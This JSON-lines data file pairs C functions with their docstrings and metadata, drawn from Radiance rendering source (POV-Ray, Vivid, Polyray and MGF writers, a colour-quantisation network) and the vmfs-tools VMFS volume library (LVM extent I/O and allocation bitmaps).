{"docstring": "/* Add a new triangle to the database */\n", "func_signal": "int opt_add_tri (float  ax, float  ay, float  az,\n\t\t float  bx, float  by, float  bz,\n\t\t float  cx, float  cy, float  cz)", "code": "{\n    TriList2 *new_node;\n    Triangle *new_tri;\n    int      i;\n\n    /* Check if the triangle is degenerate (zero area), if so return -1 */\n    if (degen_tri (ax, ay, az, bx, by, bz, cx, cy, cz))\n\treturn -1;\n\n    if (!initialized)\n\tinit_object();\n\n    /* Allocate memory for the new triangle */\n    new_tri = malloc (sizeof(Triangle));\n    if (new_tri == NULL)\n\tabortmsg (\"Insufficient memory for new triangles.\", 1);\n\n    /* Look up the vertex and texture indexes */\n    new_tri->vert[0] = vert_lookup (ax, ay, az);\n    new_tri->vert[1] = vert_lookup (bx, by, bz);\n    new_tri->vert[2] = vert_lookup (cx, cy, cz);\n\n    new_tri->text_index = texture_index;\n    new_tri->text_type  = texture_type;\n\n    new_tri->flag = 0;\n\n    for (i = 0; i < 3; i++) {\n\t/* Create a new index node */\n\tnew_node = malloc (sizeof(TriList2));\n\tif (new_node == NULL)\n\t    abortmsg (\"Insufficient memory for triangles.\", 1);\n\n\t/* Point the index entry to the new triangle */\n\tnew_node->tri = new_tri;\n\n\t/* Insert the new index node into the list */\n\tnew_node->next = groot->index[i];\n\tnew_node->prev = groot->index[i]->prev;\n\tgroot->index[i]->prev->next = new_node;\n\tgroot->index[i]->prev = new_node;\n    }\n\n    ++(groot->obj_cnt);\n\n    return 0;\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* initialise network in range (0,0,0) to (255,255,255) */\n", "func_signal": "initnet()", "code": "{\n\tregister int i;\n\tregister int *p;\n\t\n\tfor (i=0; i<netsize; i++) {\n\t\tp = network[i];\n\t\tp[0] = p[1] = p[2] = (i << (netbiasshift+8))/netsize;\n\t\tfreq[i] = intbias/netsize;  /* 1/netsize */\n\t\tbias[i] = 0;\n\t}\n}", "path": "Reference\\radiance\\src\\px\\neuclrtab.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Write a sub-tree to file */\n", "func_signal": "void write_pov10_tree (FILE *f, GroupTree *gnode, int level)", "code": "{\n    GroupTree *g;\n    TriList2  *t;\n    Triangle  *first_tri;\n    int       one_texture;\n\n    if (level == 1)\n\tfprintf (f, \"\\n/* Object '%s' */\\n\", object_name);\n\n    fprintf (f, \"composite {\\n\");\n\n    if (gnode->child != NULL) {\n\tfor (g = gnode->child; g != NULL; g = g->next)\n\t    write_pov10_tree (f, g, level+1);\n    }\n    else {\n\tfirst_tri = gnode->index[0]->next->tri;\n\tone_texture = 1;\n\n\tfor (t = gnode->index[0]->next; t != gnode->index[0]; t = t->next) {\n\t    if (t->tri->text_index != first_tri->text_index ||\n\t\tt->tri->text_type  != first_tri->text_type) {\n\t\t   one_texture = 0;\n\t\t   break;\n\t    }\n\t}\n\n\tif (one_texture) {\n\t    fprintf (f, \"\\tobject {\\n\");\n\t    fprintf (f, \"\\t\\tunion {\\n\");\n\t}\n\n\tfor (t = gnode->index[0]->next; t != gnode->index[0]; t = t->next)\n\t    write_pov10_triangle (f, t->tri, one_texture);\n\n\tif (one_texture) {\n\t    fprintf (f, \"\\t\\t}\\n\\n\\t\\t\");\n\t    write_pov10_texture (f, first_tri);\n\t    fprintf (f, \"\\n\\t}\\n\");\n\t}\n    }\n\n    if (bound_mode == 0)\n        write_pov10_bound (f, gnode);\n\n    if (level == 1 && use_transform)\n\twrite_pov10_transform (f, trans_matrix);\n\n    fprintf (f, \"}\\n\");\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Write the POV file header */\n", "func_signal": "void write_pov20_header (FILE *f)", "code": "{\n    int i;\n\n    if (psize >= MAX_TEX) {\n\tfprintf (f, \"/* Too many textures, textures generated in-line */\\n\\n\");\n\tfprintf (f, \"#declare %s = texture {\\n\", object_name);\n\tfprintf (f, \"    finish { Shiny }\\n\");\n\tfprintf (f, \"    pigment { White }\\n\");\n\tfprintf (f, \"}\\n\\n\");\n    }\n    else {\n\tif (psize > 0)\n\t    fprintf (f, \"/* Texture declarations for object '%s' */\\n\", object_name);\n\n\tfor (i = 0; i < psize; i++) {\n\t    fprintf (f, \"#declare %s_%u = texture {\\n\", object_name, i + 1);\n\t    fprintf (f, \"    finish { Shiny }\\n\");\n\t    fprintf (f, \"    pigment { color red %.3f green %.3f blue %.3f }\\n\",\n\t\t     ptable[i].red, ptable[i].green, ptable[i].blue);\n\t    fprintf (f, \"}\\n\\n\");\n\t}\n    }\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/*\n * Dummy definition of chanvalue() for calcomp routines.\n */\n", "func_signal": "double\nchanvalue(int n)", "code": "{\n\teputs(\"Call to unsupported chanvalue routine\\n\");\n\tquit(1);\n}", "path": "Reference\\radiance\\src\\common\\chanvalue.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Find the specified vertex in the vertex table */\n", "func_signal": "unsigned vert_lookup (float  x, float  y, float  z)", "code": "{\n    VertList *p, *new_node;\n    unsigned hash;\n\n    /* Vertex table is usually very large, use hash lookup */\n    hash = (unsigned)((int)(326.4*x) ^ (int)(694.7*y) ^ (int)(1423.6*z)) % HASHSIZE;\n\n    for (p = vert_hash[hash]; p != NULL; p = p->next) {\n\tif (vtable[p->vert][0] == x && vtable[p->vert][1] == y &&\n\t    vtable[p->vert][2] == z) break;\n    }\n\n    if (p != NULL)\n\treturn (p->vert);   /* found, return the table index */\n\n    /* not found, insert the new vertex into the table */\n    ++vsize;\n    if (vsize > vmax) {\n\t/* table not big enough, expand it */\n\tvmax = vmax + 100;\n\tvtable = realloc (vtable, vmax * sizeof(Vector));\n\tif (vtable == NULL)\n\t    abortmsg (\"Insufficient memory for vertices.\\n\", 1);\n    }\n\n    vect_init (vtable[vsize-1], x, y, z);\n\n    new_node = malloc (sizeof(VertList));\n    if (new_node == NULL)\n\tabortmsg (\"Insufficient memory for hash table.\", 1);\n\n    new_node->vert  = vsize-1;\n    new_node->next  = vert_hash[hash];\n    vert_hash[hash] = new_node;\n\n    return (vsize-1);\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/*\n   Writes a transformation matrix as separate POV-Ray scale< >,\n   rotate< >, and translate< > commands\n*/\n", "func_signal": "void write_pov10_transform (FILE *f, Matrix matrix)", "code": "{\n    Vector scale, shear, rotate, transl;\n\n    /* Decode the matrix into separate operations */\n    mat_decode (matrix, scale, shear, rotate, transl);\n\n    fprintf (f, \"\\n\\t/* Object transformation */\\n\");\n\n    if (fabs(scale[X] - 1.0) > 0.001 || fabs(scale[Y] - 1.0) > 0.001 || fabs(scale[Z] - 1.0) > 0.001)\n\tfprintf (f, \"\\tscale <%.3f %.3f %.3f>\\n\", scale[X], scale[Y], scale[Z]);\n\n    if (fabs(rotate[X]) > 0.01 || fabs(rotate[Y]) > 0.01 || fabs(rotate[Z]) > 0.01)\n\tfprintf (f, \"\\trotate <%.2f %.2f %.2f>\\n\", rotate[X], rotate[Y], rotate[Z]);\n\n    if (fabs(transl[X]) > 0.0001 || fabs(transl[Y]) > 0.0001 || fabs(transl[Z]) > 0.0001)\n\tfprintf (f, \"\\ttranslate <%.4f %.4f %.4f>\\n\", transl[X], transl[Y], transl[Z]);\n\n    /* Can't handle shear but warn if it's there */\n    if (fabs(shear[X]) > 0.01 || fabs(shear[Y]) > 0.01 || fabs(shear[Z]) > 0.01)\n\tprintf (\"Warning: Significant shear in transformation (ignored)\\n\");\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Parse the command line arguments to get the input file name. The depth\n * thresholding size may also be specified, as well as the disparity\n * threshold, specified in number of depth ranges, for creating depth\n * disparity lines.\n */\n", "func_signal": "void\nparse_cmd_line(int argc, char* argv[])", "code": "{\n  int i;\n  if(argc < 2)\n    return;\n  \n  for(i=1;i<argc;i++)\n  if(argv[i][0] == '-')\n    switch(argv[i][1]) {\n    case 't':\n      Tri_intersect = TRUE;\n      break;\n    case 'd':\n      Pt_delete = TRUE;\n      break;\n    case 'f':\n      if(i+1 < argc)\n      {\n\tFilename = &(argv[i+1][0]);\n\ti++;\n      }\n      else\n\tfprintf(stderr,\"Must include file name\\n\");\n    }\n    /* Nothing for now */\n}", "path": "Reference\\radiance\\src\\hd\\sm_test.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Write the optimized POV file */\n", "func_signal": "void write_file()", "code": "{\n    FILE  *f;\n\n    if (!quiet_mode)\n\tprintf (\"\\nWriting files %s and %s\\n\", out_file, inc_file);\n\n    f = fopen (out_file, \"a\");\n    if (f == NULL)\n\tabortmsg (\"Error opening output file.\", 1);\n\n    switch (out_format) {\n\tcase POV10:   write_pov10_header (f);\n\t\t      break;\n\tcase POV20:   write_pov20_header (f);\n\t\t      break;\n\tcase VIVID:   write_vivid_header (f);\n\t\t      break;\n\tcase POLYRAY: write_polyray_header (f);\n\t\t      break;\n\tcase MGF:     write_mgf_header (f);\n\t\t      break;\n    }\n\n    fclose (f);\n\n    f = fopen (inc_file, \"a\");\n    if (f == NULL)\n\tabortmsg (\"Error opening output file.\", 1);\n\n    switch (out_format) {\n\tcase POV10:   write_pov10_tree (f, groot, 1);\n\t\t      break;\n\tcase POV20:   write_pov20_tree (f, groot, 1);\n\t\t      break;\n\tcase VIVID:   write_vivid_tree (f, groot);\n\t\t      break;\n\tcase POLYRAY: write_polyray_tree (f, groot);\n\t\t      break;\n\tcase MGF:     write_mgf_tree (f, groot, 1);\n\t\t      break;\n    }\n\n    fclose (f);\n\n    if (!quiet_mode) {\n\tprintf (\"Triangles: %u, \", groot->obj_cnt);\n\tprintf (\"Vertices: %u, \", vsize);\n\tprintf (\"Bounding index: %.2f\\n\\n\", orig_tpr/final_tpr);\n    }\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Don't do this until the network has been unbiased (GW) */\n", "func_signal": "static\ncpyclrtab()", "code": "{\n\tregister int i,j,k;\n\t\n\tfor (j=0; j<netsize; j++) {\n\t\tk = network[j][3];\n\t\tfor (i = 0; i < 3; i++)\n\t\t\tclrtab[k][i] = network[j][2-i];\n\t}\n}", "path": "Reference\\radiance\\src\\px\\neuclrtab.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Write the Polyray file header */\n", "func_signal": "void write_polyray_header (FILE *f)", "code": "{\n    int i;\n\n    if (psize > 0)\n\tfprintf (f, \"// Texture declarations for object '%s'\\n\", object_name);\n\n    for (i = 0; i < psize; i++) {\n\tfprintf (f, \"define %s_%u\\n\", object_name, i + 1);\n\tfprintf (f, \"texture {\\n\");\n\tfprintf (f, \"    surface {\\n\");\n\tfprintf (f, \"        ambient <%.3f, %.3f, %.3f>, 0.1\\n\",\n\t\t    ptable[i].red, ptable[i].green, ptable[i].blue);\n\tfprintf (f, \"        diffuse <%.3f, %.3f, %.3f>, 0.7\\n\",\n\t\t    ptable[i].red, ptable[i].green, ptable[i].blue);\n\tfprintf (f, \"        specular white, 1.0\\n\");\n\tfprintf (f, \"        microfacet Reitz 10\\n\");\n\tfprintf (f, \"    }\\n\");\n\tfprintf (f, \"}\\n\\n\");\n    }\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Optimize the bounds for this sub-tree */\n", "func_signal": "void optimize_tree (GroupTree *gnode)", "code": "{\n    GroupTree *group_a, *group_b;\n    int axis, best_axis;\n    float     best_rtpr, new_rtpr;\n    TriList2  *best_loc, *new_loc;\n\n    best_rtpr = 0.0;\n    best_loc  = NULL;\n    best_axis = -1;\n\n    /* Try splitting the group in each of the three axis' (x,y,z) */\n    for (axis = 0; axis < 3; axis++) {\n\ttest_split (gnode, axis, &new_rtpr, &new_loc);\n\n\tif (new_rtpr < best_rtpr) {\n\t    best_rtpr = new_rtpr;\n\t    best_loc  = new_loc;\n\t    best_axis = axis;\n\t}\n    }\n\n    if (best_axis != -1) {\n\t/* Split this node into two nodes */\n\tsplit_group (gnode, best_axis, best_loc, &group_a, &group_b);\n\n\toptimize_tree (group_a);\n\toptimize_tree (group_b);\n    }\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Write a Vivid triangle patch */\n", "func_signal": "void write_vivid_triangle (FILE *f, Triangle *tri)", "code": "{\n    Vector norm[3];\n\n    COOPERATE\t/* support multitasking */\n\n    vert_normal (tri, norm);\n\n    fprintf (f, \"patch {\\n\");\n    fprintf (f, \"\\tvertex \");\n    vect_print (f, vtable[tri->vert[0]], dec_point, ' ');\n    fprintf (f, \" normal \");\n    vect_print (f, norm[0], 3, ' ');\n    fprintf (f, \"\\n\");\n\n    fprintf (f, \"\\tvertex \");\n    vect_print (f, vtable[tri->vert[1]], dec_point, ' ');\n    fprintf (f, \" normal \");\n    vect_print (f, norm[1], 3, ' ');\n    fprintf (f, \"\\n\");\n\n    fprintf (f, \"\\tvertex \");\n    vect_print (f, vtable[tri->vert[2]], dec_point, ' ');\n    fprintf (f, \" normal \");\n    vect_print (f, norm[2], 3, ' ');\n    fprintf (f, \"\\n\");\n\n    fprintf (f, \"}\\n\\n\");\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/*\n * Flush the packet to disk, and reset the accumulator\n */\n", "func_signal": "flush_char()", "code": "{\n        if( a_count > 0 ) {\n                fputc( a_count, g_outfile );\n                fwrite( accum, 1, a_count, g_outfile );\n                a_count = 0;\n        }\n}", "path": "Reference\\radiance\\src\\px\\ra_gif.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Write a triangle (smooth or regular) */\n", "func_signal": "void write_pov10_triangle (FILE *f, Triangle *tri, int one_texture)", "code": "{\n    Vector norm[3];\n    int    no_smooth = 0;\n\n    COOPERATE\t/* support multitasking */\n\n    if (one_texture)\n\tfprintf (f, \"\\t\\t\");\n    else\n\tfprintf (f, \"\\tobject { \");\n\n    if (smooth_angle > 0.0) {\n\tvert_normal (tri, norm);\n\n\tif (vect_equal (norm[0], norm[1]) && vect_equal (norm[1], norm[2]))\n\t    no_smooth = 1;\n    }\n\n    if (smooth_angle > 0.0 && !no_smooth) {\n\tfprintf (f, \"smooth_triangle { <\");\n\tvect_print (f, vtable[tri->vert[0]], dec_point, ' ');\n\tfprintf (f, \"> <\");\n\tvect_print (f, norm[0], 3, ' ');\n\tfprintf (f, \"> <\");\n\tvect_print (f, vtable[tri->vert[1]], dec_point, ' ');\n\tfprintf (f, \"> <\");\n\tvect_print (f, norm[1], 3, ' ');\n\tfprintf (f, \"> <\");\n\tvect_print (f, vtable[tri->vert[2]], dec_point, ' ');\n\tfprintf (f, \"> <\");\n\tvect_print (f, norm[2], 3, ' ');\n\tfprintf (f, \"> }\");\n    }\n    else {\n\tfprintf (f, \"triangle { <\");\n\tvect_print (f, vtable[tri->vert[0]], dec_point, ' ');\n\tfprintf (f, \"> <\");\n\tvect_print (f, vtable[tri->vert[1]], dec_point, ' ');\n\tfprintf (f, \"> <\");\n\tvect_print (f, vtable[tri->vert[2]], dec_point, ' ');\n\tfprintf (f, \"> }\");\n    }\n\n    if (!one_texture) {\n\tfprintf (f, \" \");\n\twrite_pov10_texture (f, tri);\n\tfprintf (f, \" }\");\n    }\n\n    fprintf (f, \"\\n\");\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/*\n   Writes a transformation matrix as separate Vivid scale,\n   rotate, and translate commands\n*/\n", "func_signal": "void write_vivid_transform (FILE *f, Matrix matrix)", "code": "{\n    Vector scale, shear, rotate, transl;\n\n    /* Decode the matrix into separate operations */\n    mat_decode (matrix, scale, shear, rotate, transl);\n\n    fprintf (f, \"\\n/* Object transformation */\\n\");\n\n    fprintf (f, \"transform {\\n\");\n\n    if (fabs(scale[X] - 1.0) > 0.001 || fabs(scale[Y] - 1.0) > 0.001 || fabs(scale[Z] - 1.0) > 0.001)\n\tfprintf (f, \"\\tscale %.3f %.3f %.3f\\n\", scale[X], scale[Y], scale[Z]);\n\n    if (fabs(rotate[X]) > 0.01 || fabs(rotate[Y]) > 0.01 || fabs(rotate[Z]) > 0.01)\n\tfprintf (f, \"\\trotate %.2f %.2f %.2f\\n\", rotate[X], rotate[Y], rotate[Z]);\n\n    if (fabs(transl[X]) > 0.0001 || fabs(transl[Y]) > 0.0001 || fabs(transl[Z]) > 0.0001)\n\tfprintf (f, \"\\ttranslate %.4f %.4f %.4f\\n\", transl[X], transl[Y], transl[Z]);\n    else\n\tfprintf (f, \"\\ttranslate 0 0 0 // Null transformation\\n\");\n\n    /* Can't handle shear but warn if it's there */\n    if (fabs(shear[X]) > 0.01 || fabs(shear[Y]) > 0.01 || fabs(shear[Z]) > 0.01)\n\tprintf (\"Warning: Significant shear in transformation (ignored)\\n\");\n\n    fprintf (f, \"}\\n\\n\");\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Write a triangle (smooth or regular) */\n", "func_signal": "void write_mgf_triangle (FILE *f, Triangle *tri)", "code": "{\n    Vector norm[3];\n    int    i;\n    int    smooth;\n\n    COOPERATE\t/* support multitasking */\n\n    write_mgf_texture (f, tri);\n\n    if (smooth_angle > 0.0) {\n\tvert_normal (tri, norm);\n\n\tsmooth = !vect_equal (norm[0], norm[1]) ||\n\t\t !vect_equal (norm[1], norm[2]);\n    } else\n\tsmooth = 0;\n\n    for (i = 0; i < 3; i++) {\n\tfprintf (f, \"v v%d =\\n\\tp \", i+1);\n\tvect_print (f, vtable[tri->vert[i]], dec_point, ' ');\n\tif (smooth) {\n\t    fprintf (f, \"\\n\\tn \");\n\t    vect_print (f, norm[i], 3, ' ');\n\t}\n\tfprintf (f, \"\\n\");\n    }\n    fprintf (f, \"f v1 v2 v3\\n\");\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* do after unbias - insertion sort of network and build netindex[0..255] */\n", "func_signal": "inxbuild()", "code": "{\n\tregister int i,j,smallpos,smallval;\n\tregister int *p,*q;\n\tint previouscol,startpos;\n\n\tpreviouscol = 0;\n\tstartpos = 0;\n\tfor (i=0; i<netsize; i++) {\n\t\tp = network[i];\n\t\tsmallpos = i;\n\t\tsmallval = p[1];\t/* index on g */\n\t\t/* find smallest in i..netsize-1 */\n\t\tfor (j=i+1; j<netsize; j++) {\n\t\t\tq = network[j];\n\t\t\tif (q[1] < smallval) {\t/* index on g */\n\t\t\t\tsmallpos = j;\n\t\t\t\tsmallval = q[1]; /* index on g */\n\t\t\t}\n\t\t}\n\t\tq = network[smallpos];\n\t\t/* swap p (i) and q (smallpos) entries */\n\t\tif (i != smallpos) {\n\t\t\tj = q[0];   q[0] = p[0];   p[0] = j;\n\t\t\tj = q[1];   q[1] = p[1];   p[1] = j;\n\t\t\tj = q[2];   q[2] = p[2];   p[2] = j;\n\t\t\tj = q[3];   q[3] = p[3];   p[3] = j;\n\t\t}\n\t\t/* smallval entry is now in position i */\n\t\tif (smallval != previouscol) {\n\t\t\tnetindex[previouscol] = (startpos+i)>>1;\n\t\t\tfor (j=previouscol+1; j<smallval; j++) netindex[j] = i;\n\t\t\tpreviouscol = smallval;\n\t\t\tstartpos = i;\n\t\t}\n\t}\n\tnetindex[previouscol] = (startpos+maxnetpos)>>1;\n\tfor (j=previouscol+1; j<256; j++) netindex[j] = maxnetpos; /* really 256 */\n}", "path": "Reference\\radiance\\src\\px\\neuclrtab.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Set a transformation matrix for the next object */\n", "func_signal": "void opt_set_transform (Matrix mat)", "code": "{\n    int i, j;\n\n    for (i = 0; i < 4; i++) {\n\tfor (j = 0; j < 3; j++)\n\t    trans_matrix[i][j] = mat[i][j];\n    }\n\n    use_transform = 1;\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
{"docstring": "/* Open an LVM */\n", "func_signal": "int vmfs_lvm_open(vmfs_lvm_t *lvm)", "code": "{\n   if (!lvm->flags.allow_missing_extents && \n       (lvm->loaded_extents != lvm->lvm_info.num_extents)) \n   {\n      fprintf(stderr, \"VMFS: Missing extents\\n\");\n      return(-1);\n   }\n\n   lvm->dev.read = vmfs_lvm_read;\n   if (lvm->flags.read_write)\n      lvm->dev.write = vmfs_lvm_write;\n   lvm->dev.reserve = vmfs_lvm_reserve;\n   lvm->dev.release = vmfs_lvm_release;\n   lvm->dev.close = vmfs_lvm_close;\n   lvm->dev.uuid = &lvm->lvm_info.uuid;\n   return(0);\n}", "path": "libvmfs\\vmfs_lvm.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Read a raw block of data on logical volume */\n", "func_signal": "static inline ssize_t vmfs_lvm_io(const vmfs_lvm_t *lvm,off_t pos,u_char *buf,\n                                  size_t len,vmfs_vol_io_func func)", "code": "{\n   vmfs_volume_t *extent = vmfs_lvm_get_extent_from_offset(lvm,pos);\n\n   if (!extent)\n      return(-1);\n\n   pos -= (uint64_t)extent->vol_info.first_segment * VMFS_LVM_SEGMENT_SIZE;\n   if ((pos + len) > vmfs_lvm_extent_size(extent)) {\n      /* TODO: Handle this case */\n      fprintf(stderr,\"VMFS: i/o spanned over several extents is unsupported\\n\");\n      return(-1);\n   }\n\n   return(func(&extent->dev,pos,buf,len));\n}", "path": "libvmfs\\vmfs_lvm.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* \n * Until we uncover the details of the segment descriptors format,\n * it is useless to try to do something more efficient.\n */\n", "func_signal": "static vmfs_volume_t *vmfs_lvm_get_extent_from_offset(const vmfs_lvm_t *lvm,\n                                                      off_t pos)", "code": "{\n   int extent;\n   off_t segment = pos / VMFS_LVM_SEGMENT_SIZE;\n\n   for (extent = 0; extent < lvm->loaded_extents; extent++) {\n      if ((segment >= lvm->extents[extent]->vol_info.first_segment) &&\n          (segment <= lvm->extents[extent]->vol_info.last_segment))\n        return(lvm->extents[extent]);\n   }\n\n   return(NULL);\n}", "path": "libvmfs\\vmfs_lvm.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Read a bitmap header */\n", "func_signal": "int vmfs_bmh_read(vmfs_bitmap_header_t *bmh,const u_char *buf)", "code": "{\n   bmh->items_per_bitmap_entry = read_le32(buf,0x0);\n   bmh->bmp_entries_per_area   = read_le32(buf,0x4);\n   bmh->hdr_size               = read_le32(buf,0x8);\n   bmh->data_size              = read_le32(buf,0xc);\n   bmh->area_size              = read_le32(buf,0x10);\n   bmh->total_items            = read_le32(buf,0x14);\n   bmh->area_count             = read_le32(buf,0x18);\n   return(0);\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Count the total number of allocated items in a bitmap */\n", "func_signal": "uint32_t vmfs_bitmap_allocated_items(vmfs_bitmap_t *b)", "code": "{\n   uint32_t count;\n   u_int i;\n   \n   for(i=0,count=0;i<b->bmh.area_count;i++)\n      count += vmfs_bitmap_area_allocated_items(b,i);\n\n   return(count);\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Update the first free item field */\n", "func_signal": "static void vmfs_bitmap_update_ffree(vmfs_bitmap_entry_t *entry)", "code": "{\n   u_int array_idx,bit_idx;\n   int i;\n\n   entry->ffree = 0;\n\n   for(i=0;i<entry->total;i++) {\n      array_idx = i >> 3;\n      bit_idx   = i & 0x07;\n\n      if (entry->bitmap[array_idx] & (1 << bit_idx)) {\n         entry->ffree = i;\n         break;\n      }\n   }\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Get position of an item */\n", "func_signal": "off_t vmfs_bitmap_get_item_pos(vmfs_bitmap_t *b,uint32_t entry,uint32_t item)", "code": "{\n   off_t pos;\n   uint32_t addr;\n   uint32_t items_per_area;\n   u_int area;\n\n   addr = (entry * b->bmh.items_per_bitmap_entry) + item;\n\n   items_per_area = vmfs_bitmap_get_items_per_area(&b->bmh);\n   area = addr / items_per_area;\n\n   pos  = b->bmh.hdr_size + (area * b->bmh.area_size);\n   pos += b->bmh.bmp_entries_per_area * VMFS_BITMAP_ENTRY_SIZE;\n   pos += (addr % items_per_area) * b->bmh.data_size;\n\n   return(pos);\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Reserve the underlying volume given a LVM position */\n", "func_signal": "static int vmfs_lvm_reserve(const vmfs_device_t *dev,off_t pos)", "code": "{\n   vmfs_lvm_t *lvm = (vmfs_lvm_t *)dev;\n   vmfs_volume_t *extent = vmfs_lvm_get_extent_from_offset(lvm,pos);\n\n   if (!extent)\n      return(-1);\n\n   return(vmfs_device_reserve(&extent->dev, 0));\n}", "path": "libvmfs\\vmfs_lvm.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Update a bitmap entry on disk */\n", "func_signal": "int vmfs_bme_update(const vmfs_fs_t *fs,const vmfs_bitmap_entry_t *bme)", "code": "{\n   DECL_ALIGNED_BUFFER(buf,VMFS_BITMAP_ENTRY_SIZE);\n\n   memset(buf,0,VMFS_BITMAP_ENTRY_SIZE);\n   vmfs_bme_write(bme,buf);\n\n   if (vmfs_device_write(fs->dev,bme->mdh.pos,buf,buf_len) != buf_len)\n      return(-1);\n\n   return(0);\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Write a bitmap header */\n", "func_signal": "int vmfs_bmh_write(const vmfs_bitmap_header_t *bmh,u_char *buf)", "code": "{\n   write_le32(buf,0x0,bmh->items_per_bitmap_entry);\n   write_le32(buf,0x4,bmh->bmp_entries_per_area);\n   write_le32(buf,0x8,bmh->hdr_size);\n   write_le32(buf,0xc,bmh->data_size);\n   write_le32(buf,0x10,bmh->area_size);\n   write_le32(buf,0x14,bmh->total_items);\n   write_le32(buf,0x18,bmh->area_count);\n   return(0);\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Call a user function for each allocated item in a bitmap */\n", "func_signal": "void vmfs_bitmap_foreach(vmfs_bitmap_t *b,vmfs_bitmap_foreach_cbk_t cbk,\n                         void *opt_arg)", "code": "{\n   u_int i;\n   \n   for(i=0;i<b->bmh.area_count;i++)\n      vmfs_bitmap_area_foreach(b,i,cbk,opt_arg);\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Find a free item in a bitmap entry and mark it allocated */\n", "func_signal": "int vmfs_bitmap_alloc_item(vmfs_bitmap_entry_t *bmp_entry,uint32_t *item)", "code": "{\n   u_int array_idx,bit_idx;\n   int i;\n\n   /* TODO: use first free field as a hint */\n\n   for(i=0;i<bmp_entry->total;i++) {\n      array_idx = i >> 3;\n      bit_idx   = i & 0x07;\n\n      if (bmp_entry->bitmap[array_idx] & (1 << bit_idx)) {\n         *item = i;\n         bmp_entry->bitmap[array_idx] &= ~(1 << bit_idx);\n         bmp_entry->free--;\n         vmfs_bitmap_update_ffree(bmp_entry);\n         return(0);\n      }\n   }\n\n   return(-1);\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
